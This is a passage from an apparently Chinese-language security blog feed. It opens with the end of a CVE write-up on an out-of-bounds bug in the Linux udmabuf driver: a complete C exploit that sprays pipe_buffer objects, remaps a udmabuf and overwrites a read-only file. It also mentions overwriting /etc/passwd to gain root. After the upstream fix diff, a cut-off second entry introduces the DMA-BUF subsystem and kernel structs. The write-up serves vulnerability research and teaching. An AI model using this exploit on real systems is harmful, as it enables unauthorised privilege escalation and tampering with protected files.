class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/udmabuf.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NR 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UDMA_PAGE_NR 128</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">prepare_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-type">int</span> err;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((err = pipe(pipe_fd[i])) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);<br>            <span class="hljs-keyword">return</span> err;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">splice_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>], <span class="hljs-type">int</span> victim_fd)</span><br>&#123;<br>    <span class="hljs-type">ssize_t</span> err;<br>    <span class="hljs-type">loff_t</span> offset;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        offset = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> ((err = splice(victim_fd, &amp;offset, pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to splice %d pipe!&quot;</span>, i);<br>            <span class="hljs-keyword">return</span> err;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">proof_of_concept</span><span class="hljs-params">(<span class="hljs-type">char</span> *target_file, <span class="hljs-type">char</span> *content)</span><br>&#123;<br>    <span class="hljs-type">int</span> dma_fd, dev_fd, mem_fd, victim_fd;<br>    <span class="hljs-type">char</span> *udma_buf, buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf_create</span> <span class="hljs-title">info</span>;</span><br>    <span class="hljs-type">int</span> pipe_fd1[PIPE_SPRAY_NR][<span class="hljs-number">2</span>], pipe_fd2[PIPE_SPRAY_NR][<span class="hljs-number">2</span>];<br><br>    <span class="hljs-comment">/* prepare stage */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Preparing...&quot;</span>);<br><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    mem_fd = memfd_create(<span class="hljs-string">&quot;test&quot;</span>, MFD_ALLOW_SEALING);<br>    <span class="hljs-keyword">if</span> (mem_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (ftruncate(mem_fd, <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to change size of mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fcntl(mem_fd, F_ADD_SEALS, F_SEAL_SHRINK) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to seal mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/udmabuf&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to open udmabuf dev file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    victim_fd = open(target_file, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (victim_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to open target victim file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">strcpy</span>(buf, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-comment">/* first heap spray */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying pipe_buffer...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (prepare_pipe(pipe_fd1) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to spray pipe_buffer&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* allocate udmabuf::pages */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating udmabuf...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    info.memfd = mem_fd;<br>    info.size = <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR;<br><br>    dma_fd = ioctl(dev_fd, UDMABUF_CREATE, &amp;info);<br>    <span class="hljs-keyword">if</span> (dma_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create dma_buf&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* second heap spray */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying pipe_buffer...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (prepare_pipe(pipe_fd2) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to spray pipe_buffer&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* mmap udmabuf stage */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] MMAP and MREMAP udmabuf...&quot;</span>);<br><br>    udma_buf = mmap(<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR,<br>        PROT_READ | PROT_WRITE,<br>        MAP_FILE | MAP_SHARED,<br>        dma_fd,<br>        <span class="hljs-number">0</span><br>    );<br>    <span class="hljs-keyword">if</span> (udma_buf == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to map dma_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    udma_buf = mremap(<br>        udma_buf,<br>        <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR,<br>        <span class="hljs-number">0x1000</span> * (UDMA_PAGE_NR + <span class="hljs-number">1</span>),<br>        MREMAP_MAYMOVE<br>    );<br>    <span class="hljs-keyword">if</span> (udma_buf == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to mremap dma_buf area&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* splicing pipe_buffer */</span><br>    <span class="hljs-keyword">if</span> (splice_pipe(pipe_fd1, victim_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to splice target fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (splice_pipe(pipe_fd2, victim_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to splice target fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* trigger out-of-bound vulnerabilities */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Triggering...&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">void</span>*) &amp;udma_buf[<span class="hljs-number">0x1000</span> * UDMA_PAGE_NR], content);<br><br>    <span class="hljs-comment">/* enjoy :) */</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">3</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Usage: ./exploit target_file_path content&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    proof_of_concept(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行，成功修改只读文件：</p><p><img src="https://s2.loli.net/2025/01/01/tNuw4HksFljrnaT.png"></p><p>有了越权文件读写的权能，在实战当中能够玩的花样就多很多了，例如通过覆写 <code>/etc/passwd</code> 完成提权：）</p><blockquote><p>需要注意的是，<code>pipe_buffer</code> 所使用的分配 flag 为 <code>GFP_KERNEL_ACCOUNT</code> ，在 <code>5.9 ~ 5.14</code> 这个内核版本范围外会使得其与 <code>udmabuf::pages</code> 分配自两个不同的 <code>kmem_cache</code> ，因此若是要在这些版本中利用该漏洞，则你可能需要一些 <a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">cross-cache overflow 与内核堆风水的技巧</a></p></blockquote><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03. 漏洞修复"></a>0x03. 漏洞修复</h1><p>这个漏洞最终在 <a href="https://github.com/torvalds/linux/commit/05b252cccb2e5c3f56119d25de684b4f810ba4">这个 commit</a> 当中被修复，修复方式是在 <code>udmabuf_vm_fault()</code> 当中添加了一个范围检查，笔者个人的感觉是 <em>虽然漏洞是修复了但是修的挺简陋的，不够优雅，因为在笔者看来还应该在 mremap 的调用链当中加入范围检查</em></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/drivers/dma-buf/udmabuf.c b/drivers/dma-buf/udmabuf.c</span><br><span class="hljs-comment">index e7330684d3b824..9631f2fd2faf7f 100644</span><br><span class="hljs-comment">--- a/drivers/dma-buf/udmabuf.c</span><br><span class="hljs-comment">+++ b/drivers/dma-buf/udmabuf.c</span><br><span class="hljs-meta">@@ -32,8 +32,11 @@</span> static vm_fault_t udmabuf_vm_fault(struct vm_fault *vmf)<br> &#123;<br> struct vm_area_struct *vma = vmf-&gt;vma;<br> struct udmabuf *ubuf = vma-&gt;vm_private_data;<br><span class="hljs-addition">+pgoff_t pgoff = vmf-&gt;pgoff;</span><br> <br><span class="hljs-deletion">-vmf-&gt;page = ubuf-&gt;pages[vmf-&gt;pgoff];</span><br><span class="hljs-addition">+if (pgoff &gt;= ubuf-&gt;pagecount)</span><br><span class="hljs-addition">+return VM_FAULT_SIGBUS;</span><br><span class="hljs-addition">+vmf-&gt;page = ubuf-&gt;pages[pgoff];</span><br> get_page(vmf-&gt;page);<br> return 0;<br> &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Linus 哥你骗我们干嘛！这 DMA-BUF 他也不无敌啊！&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://arttnba3.github.io/categories/CVE/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="CVE" scheme="https://arttnba3.github.io/tags/CVE/"/>
    
    <category term="提权" scheme="https://arttnba3.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="DMA-BUF" scheme="https://arttnba3.github.io/tags/DMA-BUF/"/>
    
  </entry>
  
  <entry>
    <title>【OS.0x06】Linux 共享内存:DMA-BUF 初探（一）</title>
    <link href="https://arttnba3.github.io/2024/11/30/OS-0X06-LINUX-DMABUF/"/>
    <id>https://arttnba3.github.io/2024/11/30/OS-0X06-LINUX-DMABUF/</id>
    <published>2024-11-30T03:33:42.000Z</published>
    <updated>2024-12-30T22:19:25.687Z</updated>
    
    <content type="html"><![CDATA[<p>世界第一 DMA-BUF 大师是对的！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>最近刚好看到一个与 DMA buffer 相关的有意思的东西，所以简单写一篇博客记录一下这是个什么玩意：）</p><p>本文涉及到的内核版本为 <code>6.11.2</code> </p><h1 id="0x01-DMA-BUF-简介"><a href="#0x01-DMA-BUF-简介" class="headerlink" title="0x01. DMA-BUF - 简介"></a>0x01. DMA-BUF - 简介</h1><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p><a href="https://docs.kernel.org/driver-api/dma-buf.html">dma-buf 子系统</a> 为不同设备驱动与其他子系统提供了一个方便统一的 <strong>内存共享框架</strong> ，常用于 GPU 及显示驱动等，其主要有三个用于交互的部分：</p><ul><li><code>dma-buf</code> ：表示一个 <code>sg_table</code> ，并作为文件描述符导出到用户空间以允许在进程、子系统、设备间传递（注：UNIX domain socket）</li><li><code>dma-fence</code> ：提供了对异步硬件操作是否完成的检测机制</li><li><code>dma-resv</code> ：为一个特定的 <code>dma-buf</code> 管理一组 <code>dma-fence</code> ，通过隐式的（内核排序的）同步工作以保持表面上的一致访问</li></ul><p>在 dma-buf 框架中主要有两个对象，分别是：</p><ul><li><code>exporter</code> ：共享内存的生产者（内核驱动）<ul><li>负责为内存实现 <code>struct dma_buf_ops</code> 操作函数表</li><li>允许通过 dma_buf API 共享内存</li><li>通过 <code>struct dma_buf</code> 管理内存分配的细节</li><li>决定实际的分配，并负责所有共享用户的 <a href="https://www.wowotech.net/memory_management/scatterlist.html">scatterlist</a> （page 为单位的物理连续内存块）迁移</li></ul></li><li><code>importer/user</code> ：共享内存的消费者（可以是用户态程序也可以是内核态驱动）<ul><li>不关心内存来源</li><li>通过 <code>struct dma_buf_attachment</code> 接口访问共享内存（一般通过共享的文件描述符获取）</li></ul></li></ul><p><img src="https://s2.loli.net/2024/12/20/RUPS1INVcml4kiL.png"></p><!-- ![](https://s2.loli.net/2024/09/19/3Mn475YFeybCXz8.png) --><blockquote><h3 id="扩展阅读：sg-table-与-scatterlist-离散连续内存"><a href="#扩展阅读：sg-table-与-scatterlist-离散连续内存" class="headerlink" title="扩展阅读：sg_table 与 scatterlist - 离散连续内存"></a>扩展阅读：sg_table 与 scatterlist - 离散连续内存</h3><p>简而言之，<strong>单个</strong> <code>scatterlist</code> 用来表示一块 <strong>物理连续</strong> 的 <strong>以页为单位</strong> 的内存块，<code>sg_table</code> 则表示一个离散 <code>scatterlist</code> <strong>数组</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">scatterlist</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>page_link;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>offset;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>length;<br><span class="hljs-type">dma_addr_t</span>dma_address;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NEED_SG_DMA_LENGTH</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>dma_length;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NEED_SG_DMA_FLAGS</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    dma_flags;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sg_table</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">scatterlist</span> *<span class="hljs-title">sgl</span>;</span><span class="hljs-comment">/* the list */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nents;<span class="hljs-comment">/* number of mapped entries */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_nents;<span class="hljs-comment">/* original size of list */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>其通常结构如下图所示：</p><p><img src="https://s2.loli.net/2024/09/20/Rr5akvXyLQCbMUd.png" alt="自己画的图"></p><p>对于分配的 scatterlist 数组长度大于一张内存页的情况，其会被分割成多块，其中单张 scatterlist 数组页面上的最后一个成员的 <code>page_link</code> 字段会用于标识是否存在下一份页面以及下一份 scatterlist 页面所在内存页：</p><p><img src="https://s2.loli.net/2024/09/20/V8w2i9QyE7Ndrg5.png" alt="自己画的图"></p></blockquote><p>具体而言，dma-buf 的通常使用流程如下：</p><ul><li><p>exporter 侧用 <code>DEFINE_DMA_BUF_EXPORT_INFO()</code> 创建一个临时 <code>dma_buf_export_info</code> 结构体，并定义导出信息，这通常包括：</p><ul><li><code>::ops</code>：自定义的 <code>struct dma_buf_ops</code> </li><li><code>::priv</code>：自定义私有数据的指针</li><li><code>::size</code> ：共享内存大小</li><li><code>::flags</code> ：内存读写权限</li></ul></li><li><p>exporter 侧调用 <code>dma_buf_export()</code> 创建 <code>dma_buf</code> 对象</p></li><li><p>exporter 侧调用 <code>dma_buf_fd()</code> 将 <code>dma_buf</code> 对象关联到一个新的文件描述符 <code>fd</code> 中（注：使用 fd 进行传递是比较常见的方式，但不唯一）</p></li><li><p>exporter 侧将 <code>fd</code> 传给 importer</p></li><li><p>importer 调用 <code>dma_buf_get(fd)</code> 获取 <code>dma_buf</code> 对象</p></li><li><p>importer 调用 <code>dma_buf_attach()</code> 和 <code>dma_buf_map_attachment()</code> 获取共享缓存的信息</p></li><li><p>importer 使用 <code>sg_table</code> 的内容</p></li><li><p>importer 调用 <code>dma_buf_detach()</code> 和 <code>dma_buf_unmap_attachment()</code> 释放对 <code>dma_buf</code> 的引用</p></li><li><p>importer 调用 <code>dma_buf_put(fd)</code> 释放文件描述符</p></li></ul><p><img src="https://s2.loli.net/2024/10/08/li3mnaFSkyrcpOW.png"></p><p>对于涉及用户态的 DMA-BUF 使用而言，将 <code>dma_buf</code> 封装到 fd 当中通常是必须的：exporter 获取共享内存对应的 <code>dma-buf</code> 的文件描述符 <code>fd</code> ，通过 ioctl 或是 UNIX domain socket 等方式发送给 importer，importer 再 <code>mmap(fd)</code> 以访问共享内存：</p><p><img src="https://s2.loli.net/2024/09/20/5kEc7D8T3gaHw4l.png"></p><blockquote><p>需要注意的是 exporter 与 importer 并不总是分离的，也可以有同时存在于同一驱动的情况（例如 DRM）</p></blockquote><h2 id="dma-buf-结构体"><a href="#dma-buf-结构体" class="headerlink" title="dma_buf 结构体"></a>dma_buf 结构体</h2><p>在 dmabuf 框架中，<code>struct dma_buf</code> 是一个重要的结构体，其用于表示一个共享内存对象，包括内存大小、绑定的文件描述符等：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> &#123;</span><br><span class="hljs-type">size_t</span> size;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">attachments</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_ops</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> vmapping_counter;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iosys_map</span> <span class="hljs-title">vmap_ptr</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *exp_name;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br><span class="hljs-type">spinlock_t</span> name_lock;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">module</span> *<span class="hljs-title">owner</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_ENABLED(CONFIG_DEBUG_FS)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list_node</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">void</span> *priv;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_resv</span> *<span class="hljs-title">resv</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> poll;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_poll_cb_t</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_fence_cb</span> <span class="hljs-title">cb</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> *poll;<br><br><span class="hljs-type">__poll_t</span> active;<br>&#125; cb_in, cb_out;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DMABUF_SYSFS_STATS</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_sysfs_entry</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kobject</span> <span class="hljs-title">kobj</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> *<span class="hljs-title">dmabuf</span>;</span><br>&#125; *sysfs_entry;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><p>比较关键的字段如下：</p><ul><li><p><code>size</code> ：共享内存的大小，在 dmabuf 的生命周期中不会发生改变</p></li><li><p><code>file</code> ： 与 dmabuf 相关联的文件描述符，供用户态操作</p></li><li><p><code>attachments</code> ：</p></li><li><p><code>ops</code> ：dmabuf 操作函数表</p></li><li><p><code>priv</code> ：即 private，私有字段，你可以在其中按需存放数据</p></li></ul><p>对于 exporter 侧而言，其需要根据需求自行实现 <code>struct dma_buf_ops</code> 当中的相应操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_ops</span> &#123;</span><br><span class="hljs-type">int</span> (*attach)(<span class="hljs-keyword">struct</span> dma_buf *, <span class="hljs-keyword">struct</span> dma_buf_attachment *);<br><span class="hljs-type">void</span> (*detach)(<span class="hljs-keyword">struct</span> dma_buf *, <span class="hljs-keyword">struct</span> dma_buf_attachment *);<br><span class="hljs-type">int</span> (*pin)(<span class="hljs-keyword">struct</span> dma_buf_attachment *attach);<br><span class="hljs-type">void</span> (*unpin)(<span class="hljs-keyword">struct</span> dma_buf_attachment *attach);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sg_table</span> * (*<span class="hljs-title">map_dma_buf</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_attachment</span> *,</span><br><span class="hljs-class"> <span class="hljs-title">enum</span> <span class="hljs-title">dma_data_direction</span>);</span><br><span class="hljs-type">void</span> (*unmap_dma_buf)(<span class="hljs-keyword">struct</span> dma_buf_attachment *,<br>      <span class="hljs-keyword">struct</span> sg_table *,<br>      <span class="hljs-keyword">enum</span> dma_data_direction);<br><span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> dma_buf *);<br><span class="hljs-type">int</span> (*begin_cpu_access)(<span class="hljs-keyword">struct</span> dma_buf *, <span class="hljs-keyword">enum</span> dma_data_direction);<br><span class="hljs-type">int</span> (*end_cpu_access)(<span class="hljs-keyword">struct</span> dma_buf *, <span class="hljs-keyword">enum</span> dma_data_direction);<br><span class="hljs-type">int</span> (*mmap)(<span class="hljs-keyword">struct</span> dma_buf *, <span class="hljs-keyword">struct</span> vm_area_struct *vma);<br><span class="hljs-type">int</span> (*vmap)(<span class="hljs-keyword">struct</span> dma_buf *dmabuf, <span class="hljs-keyword">struct</span> iosys_map *<span class="hljs-built_in">map</span>);<br><span class="hljs-type">void</span> (*vunmap)(<span 